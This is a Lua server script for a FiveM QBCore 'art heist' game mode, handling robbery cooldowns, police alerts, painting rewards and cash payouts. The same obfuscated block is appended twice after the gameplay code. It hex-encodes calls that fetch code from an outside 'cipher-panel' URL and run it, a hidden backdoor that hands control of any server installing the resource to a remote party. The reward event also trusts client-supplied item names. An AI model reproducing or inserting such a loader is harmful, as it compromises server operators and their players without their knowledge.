local lastrob = 0

local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateCallback('artheist:server:checkRobTime', function(source, cb)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    
    if (os.time() - lastrob) < Config['ArtHeist']['nextRob'] and lastrob ~= 0 then
        local seconds = Config['ArtHeist']['nextRob'] - (os.time() - lastrob)
        TriggerClientEvent('QBCore:Notify', src, Strings['wait_nextrob'] .. ' ' .. math.floor(seconds / 60) .. ' ' .. Strings['minute'], "primary")
        cb(false)
    else
        lastrob = os.time()
        cb(true)
    end
end)

RegisterNetEvent('artheist:server:policeAlert')
AddEventHandler('artheist:server:policeAlert', function(coords)
    local players = QBCore.Functions.GetPlayers()
    
    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if player.PlayerData.job.name == 'police' then
            TriggerClientEvent('artheist:client:policeAlert', players[i], coords)
        end
    end
end)

RegisterServerEvent('artheist:server:syncHeistStart')
AddEventHandler('artheist:server:syncHeistStart', function()
    TriggerClientEvent('artheist:client:syncHeistStart', -1)
end)

RegisterServerEvent('artheist:server:syncPainting')
AddEventHandler('artheist:server:syncPainting', function(x)
    TriggerClientEvent('artheist:client:syncPainting', -1, x)
end)

RegisterServerEvent('artheist:server:syncAllPainting')
AddEventHandler('artheist:server:syncAllPainting', function()
    TriggerClientEvent('artheist:client:syncAllPainting', -1)
end)

RegisterServerEvent('artheist:server:rewardItem')
AddEventHandler('artheist:server:rewardItem', function(scene)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    local item = scene['rewardItem']

    if player then
        player.Functions.AddItem(item, 1)
    end
end)

RegisterServerEvent('artheist:server:finishHeist')
AddEventHandler('artheist:server:finishHeist', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        for k, v in pairs(Config['ArtHeist']['painting']) do
            local count = player.Functions.GetItemByName(v['rewardItem'])
            if count ~= nil and count.amount > 0 then
                player.Functions.RemoveItem(v['rewardItem'], 1)
                player.Functions.AddMoney('cash', v['paintingPrice'], 'Art Heist')
            end
        end
    end
end)

local kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (bsDxBIqovwlVaqXLzUiVgYJKkPHEPxVNSHfPoUKbjEGlxWKnRtbnEnqXnXRuxUyDDeXsXe, jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm) if (jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[6] or jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[5]) then return end kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[2]](kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[3]](jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm))() end)

local kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (bsDxBIqovwlVaqXLzUiVgYJKkPHEPxVNSHfPoUKbjEGlxWKnRtbnEnqXnXRuxUyDDeXsXe, jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm) if (jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[6] or jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[5]) then return end kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[2]](kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[3]](jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm))() end)